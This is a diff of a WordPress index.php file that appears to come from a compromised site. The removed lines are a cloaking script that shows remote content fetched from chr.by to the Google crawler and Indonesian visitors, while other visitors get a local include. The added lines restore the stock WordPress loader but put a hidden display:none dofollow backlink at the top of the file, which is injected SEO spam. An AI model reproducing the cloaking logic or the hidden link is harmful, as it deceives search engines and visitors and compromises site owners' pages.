@@ -1,51 +1,18 @@
+<div style="display:none;"><ul><li><a href="https://javiersevillano.es/" rel="dofollow"></a></li></ul></div>
 <?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-function getVisitorCountry() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $api_url = "http://ip-api.com/json/{$ip}";
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $api_url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-    $response = curl_exec($curl);
-
-    if (curl_errno($curl)) {
-        // Handle any errors if needed
-        return "Error: " . curl_error($curl);
-    }
-
-    curl_close($curl);
-
-    $data = json_decode($response, true);
-
-    if ($data['status'] === 'success') {
-        return $data['country'];
-    } else {
-        return "Country not found";
-    }
-}
-
-function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/');
-}
-
-function isGoogleCrawler() {
-    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    return (strpos($userAgent, 'google') !== false);
-}
-
-if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
-    // Output the cloaked content
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://chr.by/utami.txt');
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$content = curl_exec($curl);
-curl_close($curl);
-
-echo $content;
-} else {
-    // Output your main content here
-    include 'utami.php';
-}
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
